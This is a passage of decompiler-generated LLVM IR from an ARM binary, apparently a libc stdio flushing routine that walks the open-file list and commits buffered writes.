  %v1_17c4c = phi i32 [ %v0_17c48, %dec_label_pc_17c48 ], [ 0, %dec_label_pc_17c1c ], [ %v1_17c2c.pre, %dec_label_pc_17c34.dec_label_pc_17c28_crit_edge ]
  %v3_17c4c = icmp uge i32 %v0_17c4c, %v1_17c4c
  store i1 %v3_17c4c, i1* %cpsr_c.global-to-local, align 1
  %v9_17c4c = icmp eq i32 %v0_17c4c, %v1_17c4c
  br i1 %v9_17c4c, label %bb68, label %bb67

bb67:                                             ; preds = %dec_label_pc_17c4c
  %v1_17c50 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v1_17c50, i32* %r0.global-to-local, align 4
  br label %bb68

bb68:                                             ; preds = %dec_label_pc_17c4c, %bb67
  %v1_17c54 = xor i1 %v9_17c4c, true
  call void @__pseudo_cond_branch(i1 %v1_17c54, i32 ptrtoint (i32* @global_var_1543c.528 to i32))
  %v0_17c58 = load i32, i32* %r8.global-to-local, align 4
  %v1_17c58 = load i32, i32* %r5.global-to-local, align 4
  %v2_17c58 = add i32 %v1_17c58, 8
  %v3_17c58 = inttoptr i32 %v2_17c58 to i32*
  store i32 %v0_17c58, i32* %v3_17c58, align 4
  %v0_17c60.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_17c5c

dec_label_pc_17c5c:                               ; preds = %dec_label_pc_17c08, %bb68
  %v0_17c6c = phi i32 [ %v0_17c0c, %dec_label_pc_17c08 ], [ %v0_17c60.pre, %bb68 ]
  store i32 152, i32* %r3.global-to-local, align 4
  %v2_17c60 = add i32 %v0_17c6c, 152
  %v3_17c60 = inttoptr i32 %v2_17c60 to i32*
  %v4_17c60 = load i32, i32* %v3_17c60, align 4
  store i32 %v4_17c60, i32* %r0.global-to-local, align 4
  store i32 76, i32* %r3.global-to-local, align 4
  %v1_17c68 = add i32 %v4_17c60, 4
  %v2_17c68 = inttoptr i32 %v1_17c68 to i32*
  %v3_17c68 = load i32, i32* %v2_17c68, align 4
  store i32 %v3_17c68, i32* %r1.global-to-local, align 4
  %v2_17c6c = add i32 %v0_17c6c, 76
  %v3_17c6c = inttoptr i32 %v2_17c6c to i32*
  %v4_17c6c = load i32, i32* %v3_17c6c, align 4
  store i32 %v4_17c6c, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17c70 = icmp eq i32 %v3_17c68, 0
  %v1_17c74 = inttoptr i32 %v4_17c6c to i32*
  %v2_17c74 = load i32, i32* %v1_17c74, align 4
  store i32 %v2_17c74, i32* @r5, align 4
  br i1 %v2_17c70, label %dec_label_pc_17c7c, label %dec_label_pc_17cdc

dec_label_pc_17c7c:                               ; preds = %dec_label_pc_17c5c
  %v2_17c7c = add i32 %v4_17c60, 8
  %v3_17c7c = inttoptr i32 %v2_17c7c to i32*
  store i32 0, i32* %v3_17c7c, align 4
  %v0_17c80 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_17c80, i32* @r7, align 4
  br label %dec_label_pc_17c84

dec_label_pc_17c84:                               ; preds = %dec_label_pc_17cb4.dec_label_pc_17c84_crit_edge, %dec_label_pc_17c7c
  %v0_17c84 = phi i32 [ %v0_17c84.pre, %dec_label_pc_17cb4.dec_label_pc_17c84_crit_edge ], [ %v0_17c80, %dec_label_pc_17c7c ]
  %v1_17c84 = inttoptr i32 %v0_17c84 to i32*
  %v2_17c84 = load i32, i32* %v1_17c84, align 4
  store i32 %v2_17c84, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17c84, i32* %r2.global-to-local, align 4
  %v2_17c90111 = load i32, i32* %v1_17c84, align 4
  store i32 %v2_17c90111, i32* %r3.global-to-local, align 4
  %v3_17c94113 = icmp uge i32 %v2_17c90111, %v2_17c84
  store i1 %v3_17c94113, i1* %cpsr_c.global-to-local, align 1
  %v9_17c94119 = icmp eq i32 %v2_17c90111, %v2_17c84
  br i1 %v9_17c94119, label %dec_label_pc_17c9c, label %dec_label_pc_17cb4

dec_label_pc_17c9c:                               ; preds = %dec_label_pc_17c84, %dec_label_pc_17c9c.dec_label_pc_17c90_crit_edge
  %v0_17c9c120 = phi i32 [ %v1_17c94.pre, %dec_label_pc_17c9c.dec_label_pc_17c90_crit_edge ], [ %v2_17c84, %dec_label_pc_17c84 ]
  store i32 %v0_17c9c120, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17cac = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17cac, label %dec_label_pc_17cb0, label %dec_label_pc_17c9c.dec_label_pc_17c90_crit_edge

dec_label_pc_17c9c.dec_label_pc_17c90_crit_edge:  ; preds = %dec_label_pc_17c9c
  %v0_17c90.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17c94.pre = load i32, i32* @r4, align 4
  %v1_17c90 = inttoptr i32 %v0_17c90.pre to i32*
  %v2_17c90 = load i32, i32* %v1_17c90, align 4
  store i32 %v2_17c90, i32* %r3.global-to-local, align 4
  %v3_17c94 = icmp uge i32 %v2_17c90, %v1_17c94.pre
  store i1 %v3_17c94, i1* %cpsr_c.global-to-local, align 1
  %v9_17c94 = icmp eq i32 %v2_17c90, %v1_17c94.pre
  br i1 %v9_17c94, label %dec_label_pc_17c9c, label %dec_label_pc_17cb4

dec_label_pc_17cb0:                               ; preds = %dec_label_pc_17c9c
  %v0_17cb0 = load i32, i32* @r4, align 4
  store i32 %v0_17cb0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17cb4

dec_label_pc_17cb4:                               ; preds = %dec_label_pc_17c84, %dec_label_pc_17c9c.dec_label_pc_17c90_crit_edge, %dec_label_pc_17cb0
  %v0_17cbc = phi i32 [ %v0_17cb0, %dec_label_pc_17cb0 ], [ %v2_17c90111, %dec_label_pc_17c84 ], [ %v2_17c90, %dec_label_pc_17c9c.dec_label_pc_17c90_crit_edge ]
  %v1_17cb4 = phi i32 [ %v0_17cb0, %dec_label_pc_17cb0 ], [ %v2_17c84, %dec_label_pc_17c84 ], [ %v1_17c94.pre, %dec_label_pc_17c9c.dec_label_pc_17c90_crit_edge ]
  %v3_17cb4 = icmp uge i32 %v0_17cbc, %v1_17cb4
  store i1 %v3_17cb4, i1* %cpsr_c.global-to-local, align 1
  %v9_17cb4 = icmp eq i32 %v0_17cbc, %v1_17cb4
  br i1 %v9_17cb4, label %dec_label_pc_17cbc, label %dec_label_pc_17cb4.dec_label_pc_17c84_crit_edge

dec_label_pc_17cb4.dec_label_pc_17c84_crit_edge:  ; preds = %dec_label_pc_17cb4
  %v0_17c84.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17c84

dec_label_pc_17cbc:                               ; preds = %dec_label_pc_17cb4
  %v2_17cbc = icmp ne i32 %v1_17cb4, 0
  store i1 %v2_17cbc, i1* %cpsr_c.global-to-local, align 1
  %v7_17cc0 = icmp slt i32 %v1_17cb4, 2
  br i1 %v7_17cc0, label %dec_label_pc_17cdcthread-pre-split, label %dec_label_pc_17cc4

dec_label_pc_17cc4:                               ; preds = %dec_label_pc_17cbc
  %v0_17cc4 = load i32, i32* @r7, align 4
  store i32 %v0_17cc4, i32* %r0.global-to-local, align 4
  %v0_17cc8 = load i32, i32* %r1.global-to-local, align 4
  %v1_17cc8 = add i32 %v0_17cc8, 129
  store i32 %v1_17cc8, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17cdcthread-pre-split

dec_label_pc_17cdcthread-pre-split:               ; preds = %dec_label_pc_17cbc, %dec_label_pc_17cc4
  %v0_17e28.pr.pr = load i32, i32* @r5, align 4
  br label %dec_label_pc_17cdc

dec_label_pc_17cdc:                               ; preds = %dec_label_pc_17cdcthread-pre-split, %dec_label_pc_17c5c
  %v0_17e28.pr = phi i32 [ %v0_17e28.pr.pr, %dec_label_pc_17cdcthread-pre-split ], [ %v2_17c74, %dec_label_pc_17c5c ]
  store i32 92, i32* %sb.global-to-local, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  store i32 -1, i32* %fp.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17e2818 = icmp eq i32 %v0_17e28.pr, 0
  br i1 %v2_17e2818, label %dec_label_pc_17e30, label %dec_label_pc_17cec

dec_label_pc_17cec:                               ; preds = %dec_label_pc_17cdc, %dec_label_pc_17e24
  %v0_17d14 = phi i32 [ %v3_17e24, %dec_label_pc_17e24 ], [ %v0_17e28.pr, %dec_label_pc_17cdc ]
  %v1_17cec = inttoptr i32 %v0_17d14 to i16*
  %v2_17cec = load i16, i16* %v1_17cec, align 2
  %v3_17cec = zext i16 %v2_17cec to i32
  store i32 %v3_17cec, i32* %r3.global-to-local, align 4
  %v1_17cf0 = and i32 %v3_17cec, 64
  %v2_17cf0 = icmp eq i32 %v1_17cf0, 0
  br i1 %v2_17cf0, label %dec_label_pc_17e24, label %dec_label_pc_17cf8

dec_label_pc_17cf8:                               ; preds = %dec_label_pc_17cec
  %v0_17cf8 = load i32, i32* @r6, align 4
  %v1_17cf8 = load i32, i32* %sb.global-to-local, align 4
  %v2_17cf8 = add i32 %v1_17cf8, %v0_17cf8
  %v3_17cf8 = inttoptr i32 %v2_17cf8 to i32*
  %v4_17cf8 = load i32, i32* %v3_17cf8, align 4
  store i32 %v4_17cf8, i32* %r3.global-to-local, align 4
  %v1_17cfc = inttoptr i32 %v4_17cf8 to i32*
  %v2_17cfc = load i32, i32* %v1_17cfc, align 4
  store i32 %v2_17cfc, i32* %r3.global-to-local, align 4
  %v2_17d00 = icmp ugt i32 %v2_17cfc, 1
  store i1 %v2_17d00, i1* %cpsr_c.global-to-local, align 1
  %v7_17d00 = icmp eq i32 %v2_17cfc, 2
  br i1 %v7_17d00, label %dec_label_pc_17d64, label %dec_label_pc_17d08

dec_label_pc_17d08:                               ; preds = %dec_label_pc_17cf8
  %v1_17d08 = add i32 %v0_17d14, 64
  %v2_17d08 = inttoptr i32 %v1_17d08 to i32*
  %v3_17d08 = load i32, i32* %v2_17d08, align 4
  store i32 %v3_17d08, i32* %r3.global-to-local, align 4
  %v1_17d0c = load i32, i32* %r8.global-to-local, align 4
  %v3_17d0c = icmp uge i32 %v3_17d08, %v1_17d0c
  store i1 %v3_17d0c, i1* %cpsr_c.global-to-local, align 1
  %v9_17d0c = icmp eq i32 %v3_17d08, %v1_17d0c
  br i1 %v9_17d0c, label %dec_label_pc_17d58, label %dec_label_pc_17d14

dec_label_pc_17d14:                               ; preds = %dec_label_pc_17d08
  %v1_17d14 = add i32 %v0_17d14, 56
  store i32 %v1_17d14, i32* @r7, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 %v1_17d14, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r4, align 4
  %v1_17d2486 = inttoptr i32 %v1_17d14 to i32*
  %v2_17d2487 = load i32, i32* %v1_17d2486, align 4
  store i32 %v2_17d2487, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v9_17d2894 = icmp eq i32 %v2_17d2487, 0
  br i1 %v9_17d2894, label %dec_label_pc_17d30, label %dec_label_pc_17d48

dec_label_pc_17d30:                               ; preds = %dec_label_pc_17d14, %dec_label_pc_17d30.dec_label_pc_17d24_crit_edge
  %v0_17d3095 = phi i32 [ %v1_17d28.pre, %dec_label_pc_17d30.dec_label_pc_17d24_crit_edge ], [ 0, %dec_label_pc_17d14 ]
  store i32 %v0_17d3095, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17d40 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17d40, label %dec_label_pc_17d44, label %dec_label_pc_17d30.dec_label_pc_17d24_crit_edge

dec_label_pc_17d30.dec_label_pc_17d24_crit_edge:  ; preds = %dec_label_pc_17d30
  %v0_17d24.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17d28.pre = load i32, i32* @r4, align 4
  %v1_17d24 = inttoptr i32 %v0_17d24.pre to i32*
  %v2_17d24 = load i32, i32* %v1_17d24, align 4
  store i32 %v2_17d24, i32* %r3.global-to-local, align 4
  %v3_17d28 = icmp uge i32 %v2_17d24, %v1_17d28.pre
  store i1 %v3_17d28, i1* %cpsr_c.global-to-local, align 1
  %v9_17d28 = icmp eq i32 %v2_17d24, %v1_17d28.pre
  br i1 %v9_17d28, label %dec_label_pc_17d30, label %dec_label_pc_17d48

dec_label_pc_17d44:                               ; preds = %dec_label_pc_17d30
  %v0_17d44 = load i32, i32* @r4, align 4
  store i32 %v0_17d44, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17d48

dec_label_pc_17d48:                               ; preds = %dec_label_pc_17d14, %dec_label_pc_17d30.dec_label_pc_17d24_crit_edge, %dec_label_pc_17d44
  %v0_17d48 = phi i32 [ %v0_17d44, %dec_label_pc_17d44 ], [ %v2_17d2487, %dec_label_pc_17d14 ], [ %v2_17d24, %dec_label_pc_17d30.dec_label_pc_17d24_crit_edge ]
  %v1_17d48 = phi i32 [ %v0_17d44, %dec_label_pc_17d44 ], [ 0, %dec_label_pc_17d14 ], [ %v1_17d28.pre, %dec_label_pc_17d30.dec_label_pc_17d24_crit_edge ]
  %v3_17d48 = icmp uge i32 %v0_17d48, %v1_17d48
  store i1 %v3_17d48, i1* %cpsr_c.global-to-local, align 1
  %v9_17d48 = icmp eq i32 %v0_17d48, %v1_17d48
  br i1 %v9_17d48, label %bb70, label %bb69

bb69:                                             ; preds = %dec_label_pc_17d48
  %v1_17d4c = load i32, i32* @r7, align 4
  store i32 %v1_17d4c, i32* %r0.global-to-local, align 4
  br label %bb70

bb70:                                             ; preds = %dec_label_pc_17d48, %bb69
  %v1_17d50 = xor i1 %v9_17d48, true
  call void @__pseudo_cond_branch(i1 %v1_17d50, i32 ptrtoint (i32* @global_var_1543c.528 to i32))
  %v0_17d54 = load i32, i32* %r8.global-to-local, align 4
  %v1_17d54 = load i32, i32* @r5, align 4
  %v2_17d54 = add i32 %v1_17d54, 64
  %v3_17d54 = inttoptr i32 %v2_17d54 to i32*
  store i32 %v0_17d54, i32* %v3_17d54, align 4
  %v0_17d58.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17d58

dec_label_pc_17d58:                               ; preds = %dec_label_pc_17d08, %bb70
  %v0_17d58 = phi i32 [ %v0_17d14, %dec_label_pc_17d08 ], [ %v0_17d58.pre, %bb70 ]
  %v1_17d58 = add i32 %v0_17d58, 60
  %v2_17d58 = inttoptr i32 %v1_17d58 to i32*
  %v3_17d58 = load i32, i32* %v2_17d58, align 4
  %v1_17d5c = add i32 %v3_17d58, 1
  store i32 %v1_17d5c, i32* %r3.global-to-local, align 4
  store i32 %v1_17d5c, i32* %v2_17d58, align 4
  %v0_17d64.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_17d64

dec_label_pc_17d64:                               ; preds = %dec_label_pc_17cf8, %dec_label_pc_17d58
  %v0_17d7c = phi i32 [ %v0_17d14, %dec_label_pc_17cf8 ], [ %v0_17d64.pre, %dec_label_pc_17d58 ]
  %v1_17d64 = inttoptr i32 %v0_17d7c to i16*
  %v2_17d64 = load i16, i16* %v1_17d64, align 2
  %v3_17d64 = zext i16 %v2_17d64 to i32
  store i32 %stack_var_-44.1, i32* %r2.global-to-local, align 4
  %v2_17d6c = or i32 %v3_17d64, %stack_var_-44.1
  %v1_17d70 = xor i32 %v2_17d6c, 320
  store i32 %v1_17d70, i32* %r3.global-to-local, align 4
  %v1_17d74 = and i32 %v1_17d70, 832
  %v2_17d74 = icmp eq i32 %v1_17d74, 0
  br i1 %v2_17d74, label %dec_label_pc_17d7c, label %bb71

dec_label_pc_17d7c:                               ; preds = %dec_label_pc_17d64
  store i32 %v0_17d7c, i32* %r0.global-to-local, align 4
  %v1_17d80 = call i32 @__stdio_wcommit(i32 %v0_17d7c)
  store i32 %v1_17d80, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17d84 = icmp eq i32 %v1_17d80, 0
  br i1 %v2_17d84, label %.thread6, label %.thread7

.thread6:                                         ; preds = %dec_label_pc_17d7c
  %v1_17d88 = load i32, i32* @r5, align 4
  %v2_17d88 = inttoptr i32 %v1_17d88 to i16*
  %v3_17d88 = load i16, i16* %v2_17d88, align 2
  %v4_17d88 = zext i16 %v3_17d88 to i32
  store i32 %v4_17d88, i32* %r3.global-to-local, align 4
  %v2_17d8c = add i32 %v1_17d88, 8
  %v3_17d8c = inttoptr i32 %v2_17d8c to i32*
  %v4_17d8c = load i32, i32* %v3_17d8c, align 4
  store i32 %v4_17d8c, i32* %r2.global-to-local, align 4
  %v2_17d90 = and i32 %v4_17d88, 65471
  store i32 %v2_17d90, i32* %r3.global-to-local, align 4
  %v3_17d94 = add i32 %v1_17d88, 28
  %v4_17d94 = inttoptr i32 %v3_17d94 to i32*
  store i32 %v4_17d8c, i32* %v4_17d94, align 4
  %v1_17d98 = load i32, i32* %r3.global-to-local, align 4
  %v2_17d98 = trunc i32 %v1_17d98 to i16
  %v3_17d98 = load i32, i32* @r5, align 4
  %v4_17d98 = inttoptr i32 %v3_17d98 to i16*
  store i16 %v2_17d98, i16* %v4_17d98, align 2
  br label %bb71

.thread7:                                         ; preds = %dec_label_pc_17d7c
  %v1_17d9c = load i32, i32* %fp.global-to-local, align 4
  store i32 %v1_17d9c, i32* %sl.global-to-local, align 4
  br label %bb71

bb71:                                             ; preds = %.thread6, %dec_label_pc_17d64, %.thread7
  %v0_17da0 = load i32, i32* @r6, align 4
  %v1_17da0 = load i32, i32* %sb.global-to-local, align 4
  %v2_17da0 = add i32 %v1_17da0, %v0_17da0
  %v3_17da0 = inttoptr i32 %v2_17da0 to i32*
  %v4_17da0 = load i32, i32* %v3_17da0, align 4
  store i32 %v4_17da0, i32* %r3.global-to-local, align 4
  %v1_17da4 = inttoptr i32 %v4_17da0 to i32*
  %v2_17da4 = load i32, i32* %v1_17da4, align 4
  store i32 %v2_17da4, i32* %r3.global-to-local, align 4
  %v2_17da8 = icmp ugt i32 %v2_17da4, 1
  store i1 %v2_17da8, i1* %cpsr_c.global-to-local, align 1
  %v7_17da8 = icmp eq i32 %v2_17da4, 2
  br i1 %v7_17da8, label %dec_label_pc_17e24, label %dec_label_pc_17db0

dec_label_pc_17db0:                               ; preds = %bb71
  %v0_17db0 = load i32, i32* @r5, align 4
  %v1_17db0 = add i32 %v0_17db0, 60
  %v2_17db0 = inttoptr i32 %v1_17db0 to i32*
  %v3_17db0 = load i32, i32* %v2_17db0, align 4
  %v1_17db4 = add i32 %v3_17db0, -1
  store i32 %v1_17db4, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17db8 = icmp eq i32 %v1_17db4, 0
  store i32 %v1_17db4, i32* %v2_17db0, align 4
  br i1 %v2_17db8, label %dec_label_pc_17dc4, label %dec_label_pc_17e24

dec_label_pc_17dc4:                               ; preds = %dec_label_pc_17db0
  %v0_17dc4 = load i32, i32* %r3.global-to-local, align 4
  %v1_17dc4 = load i32, i32* @r5, align 4
  %v2_17dc4 = add i32 %v1_17dc4, 64
  %v3_17dc4 = inttoptr i32 %v2_17dc4 to i32*
  store i32 %v0_17dc4, i32* %v3_17dc4, align 4
  %v0_17dc8 = load i32, i32* @r5, align 4
  %v1_17dc8 = add i32 %v0_17dc8, 56
  store i32 %v1_17dc8, i32* @r7, align 4
  br label %dec_label_pc_17dcc

dec_label_pc_17dcc:                               ; preds = %dec_label_pc_17dfc.dec_label_pc_17dcc_crit_edge, %dec_label_pc_17dc4
  %v0_17dd4 = phi i32 [ %v0_17dd4.pre, %dec_label_pc_17dfc.dec_label_pc_17dcc_crit_edge ], [ %v1_17dc8, %dec_label_pc_17dc4 ]
  %v0_17dcc = phi i32 [ %v0_17dcc.pre, %dec_label_pc_17dfc.dec_label_pc_17dcc_crit_edge ], [ %v0_17dc8, %dec_label_pc_17dc4 ]
  %v1_17dcc = add i32 %v0_17dcc, 56
  %v2_17dcc = inttoptr i32 %v1_17dcc to i32*
  %v3_17dcc = load i32, i32* %v2_17dcc, align 4
  store i32 %v3_17dcc, i32* @r4, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 %v0_17dd4, i32* %r2.global-to-local, align 4
  %v1_17dd897 = inttoptr i32 %v0_17dd4 to i32*
  %v2_17dd898 = load i32, i32* %v1_17dd897, align 4
  store i32 %v2_17dd898, i32* %r3.global-to-local, align 4
  %v3_17ddc100 = icmp uge i32 %v2_17dd898, %v3_17dcc
  store i1 %v3_17ddc100, i1* %cpsr_c.global-to-local, align 1
  %v9_17ddc106 = icmp eq i32 %v2_17dd898, %v3_17dcc
  br i1 %v9_17ddc106, label %dec_label_pc_17de4, label %dec_label_pc_17dfc

dec_label_pc_17de4:                               ; preds = %dec_label_pc_17dcc, %dec_label_pc_17de4.dec_label_pc_17dd8_crit_edge
  %v0_17de4107 = phi i32 [ %v1_17ddc.pre, %dec_label_pc_17de4.dec_label_pc_17dd8_crit_edge ], [ %v3_17dcc, %dec_label_pc_17dcc ]
  store i32 %v0_17de4107, i32* %r0.global-to-local, align 4
  store i32 -61441, i32* %r3.global-to-local, align 4
  call void @__pseudo_branch(i32 -61504)
  %v0_17df4 = load i1, i1* %cpsr_c.global-to-local, align 1
  br i1 %v0_17df4, label %dec_label_pc_17df8, label %dec_label_pc_17de4.dec_label_pc_17dd8_crit_edge

dec_label_pc_17de4.dec_label_pc_17dd8_crit_edge:  ; preds = %dec_label_pc_17de4
  %v0_17dd8.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_17ddc.pre = load i32, i32* @r4, align 4
  %v1_17dd8 = inttoptr i32 %v0_17dd8.pre to i32*
  %v2_17dd8 = load i32, i32* %v1_17dd8, align 4
  store i32 %v2_17dd8, i32* %r3.global-to-local, align 4
  %v3_17ddc = icmp uge i32 %v2_17dd8, %v1_17ddc.pre
  store i1 %v3_17ddc, i1* %cpsr_c.global-to-local, align 1
  %v9_17ddc = icmp eq i32 %v2_17dd8, %v1_17ddc.pre
  br i1 %v9_17ddc, label %dec_label_pc_17de4, label %dec_label_pc_17dfc

dec_label_pc_17df8:                               ; preds = %dec_label_pc_17de4
  %v0_17df8 = load i32, i32* @r4, align 4
  store i32 %v0_17df8, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17dfc

dec_label_pc_17dfc:                               ; preds = %dec_label_pc_17dcc, %dec_label_pc_17de4.dec_label_pc_17dd8_crit_edge, %dec_label_pc_17df8
  %v0_17e04 = phi i32 [ %v0_17df8, %dec_label_pc_17df8 ], [ %v2_17dd898, %dec_label_pc_17dcc ], [ %v2_17dd8, %dec_label_pc_17de4.dec_label_pc_17dd8_crit_edge ]
  %v1_17dfc = phi i32 [ %v0_17df8, %dec_label_pc_17df8 ], [ %v3_17dcc, %dec_label_pc_17dcc ], [ %v1_17ddc.pre, %dec_label_pc_17de4.dec_label_pc_17dd8_crit_edge ]
  %v3_17dfc = icmp uge i32 %v0_17e04, %v1_17dfc
  store i1 %v3_17dfc, i1* %cpsr_c.global-to-local, align 1
  %v9_17dfc = icmp eq i32 %v0_17e04, %v1_17dfc
  br i1 %v9_17dfc, label %dec_label_pc_17e04, label %dec_label_pc_17dfc.dec_label_pc_17dcc_crit_edge

dec_label_pc_17dfc.dec_label_pc_17dcc_crit_edge:  ; preds = %dec_label_pc_17dfc
  %v0_17dcc.pre = load i32, i32* @r5, align 4
  %v0_17dd4.pre = load i32, i32* @r7, align 4
  br label %dec_label_pc_17dcc

dec_label_pc_17e04:                               ; preds = %dec_label_pc_17dfc
  %v2_17e04 = icmp ne i32 %v1_17dfc, 0
  store i1 %v2_17e04, i1* %cpsr_c.global-to-local, align 1
  %v7_17e08 = icmp slt i32 %v1_17dfc, 2
  br i1 %v7_17e08, label %dec_label_pc_17e24, label %dec_label_pc_17e0c

dec_label_pc_17e0c:                               ; preds = %dec_label_pc_17e04
  %v0_17e0c = load i32, i32* @r5, align 4
  %v1_17e0c = add i32 %v0_17e0c, 56
  store i32 %v1_17e0c, i32* %r0.global-to-local, align 4
  %v0_17e10 = load i32, i32* %r1.global-to-local, align 4
  %v1_17e10 = add i32 %v0_17e10, 129
  store i32 %v1_17e10, i32* %r1.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_17e24

dec_label_pc_17e24:                               ; preds = %dec_label_pc_17db0, %dec_label_pc_17e0c, %dec_label_pc_17e04, %bb71, %dec_label_pc_17cec
  %v0_17e24 = load i32, i32* @r5, align 4
  %v1_17e24 = add i32 %v0_17e24, 32
  %v2_17e24 = inttoptr i32 %v1_17e24 to i32*
  %v3_17e24 = load i32, i32* %v2_17e24, align 4
  store i32 %v3_17e24, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17e28 = icmp eq i32 %v3_17e24, 0
  br i1 %v2_17e28, label %dec_label_pc_17e30, label %dec_label_pc_17cec

dec_label_pc_17e30:                               ; preds = %dec_label_pc_17e24, %dec_label_pc_17cdc
  %v0_17e30 = call i32 @_stdio_openlist_dec_use()
  store i32 %v0_17e30, i32* %r0.global-to-local, align 4
  %v0_17e6c.pre = load i32, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17e38:                               ; preds = %dec_label_pc_17b14
  %v3_17e38 = load i16, i16* %arg1, align 2
  %v4_17e38 = zext i16 %v3_17e38 to i32
  %v1_17e3c = and i32 %v4_17e38, 64
  store i32 %v1_17e3c, i32* %r3.global-to-local, align 4
  %v2_17e3c = icmp eq i32 %v1_17e3c, 0
  br i1 %v2_17e3c, label %bb72, label %dec_label_pc_17e48

bb72:                                             ; preds = %dec_label_pc_17e38
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

dec_label_pc_17e48:                               ; preds = %dec_label_pc_17e38
  %v2_17e48 = call i32 @__stdio_wcommit(i32 %tmp)
  store i32 %v2_17e48, i32* %r0.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_17e4c = icmp eq i32 %v2_17e48, 0
  br i1 %v2_17e4c, label %.thread14, label %.thread16

.thread16:                                        ; preds = %dec_label_pc_17e48
  store i32 -1, i32* %sl.global-to-local, align 4
  br label %bb73

.thread14:                                        ; preds = %dec_label_pc_17e48
  %v1_17e50 = load i32, i32* @r4, align 4
  %v2_17e50 = inttoptr i32 %v1_17e50 to i16*
  %v3_17e50 = load i16, i16* %v2_17e50, align 2
  %v4_17e50 = zext i16 %v3_17e50 to i32
  store i32 %v4_17e50, i32* %r3.global-to-local, align 4
  %v2_17e54 = add i32 %v1_17e50, 8
  %v3_17e54 = inttoptr i32 %v2_17e54 to i32*
  %v4_17e54 = load i32, i32* %v3_17e54, align 4
  store i32 %v4_17e54, i32* %r2.global-to-local, align 4
  %v2_17e58 = and i32 %v4_17e50, 65471
  store i32 %v2_17e58, i32* %r3.global-to-local, align 4
  %v2_17e5c = trunc i32 %v2_17e58 to i16
  store i16 %v2_17e5c, i16* %v2_17e50, align 2
  %v1_17e60 = load i32, i32* %r2.global-to-local, align 4
  %v2_17e60 = load i32, i32* @r4, align 4
  %v3_17e60 = add i32 %v2_17e60, 28
  %v4_17e60 = inttoptr i32 %v3_17e60 to i32*
  store i32 %v1_17e60, i32* %v4_17e60, align 4
  store i32 0, i32* %sl.global-to-local, align 4
  br label %bb73

bb73:                                             ; preds = %bb72, %.thread16, %dec_label_pc_17e30, %.thread14
  %v0_17e6c = phi i32 [ -1, %.thread16 ], [ 0, %bb72 ], [ %v0_17e6c.pre, %dec_label_pc_17e30 ], [ 0, %.thread14 ]
  store i32 %v0_17e6c, i32* %r0.global-to-local, align 4
  store i32 %v6_17ae8, i32* %r5.global-to-local, align 4
  ret i32 %v0_17e6c

; uselistorder directives
  uselistorder i32 %v0_17e6c, { 1, 0 }
  uselistorder i32 %v3_17e24, { 1, 2, 0 }
  uselistorder i32 %v0_17df8, { 1, 0, 2 }
  uselistorder i32 %v1_17ddc.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17d7c, { 1, 0, 2 }
  uselistorder i32 %v0_17d44, { 1, 0, 2 }
  uselistorder i32 %v1_17d28.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_17d0c, { 1, 0 }
  uselistorder i32 %v0_17cb0, { 1, 0, 2 }
  uselistorder i32 %v1_17c94.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17c84, { 1, 0 }
  uselistorder i32 %v0_17c48, { 1, 0, 2 }
  uselistorder i32 %v1_17c2c.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_17c14, { 1, 0 }
  uselistorder i32 %v0_17bdc, { 1, 0, 2 }
  uselistorder i32 %v1_17bc0.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v0_17bb0, { 1, 0 }
  uselistorder i32 %v0_17b6c, { 1, 0, 2 }
  uselistorder i32 %v1_17b50.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v4_17b28, { 2, 1, 0, 3 }
  uselistorder i32 %tmp, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %sl.global-to-local, { 0, 5, 1, 3, 2, 4 }
  uselistorder i32* %r5.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 8, 7, 9 }
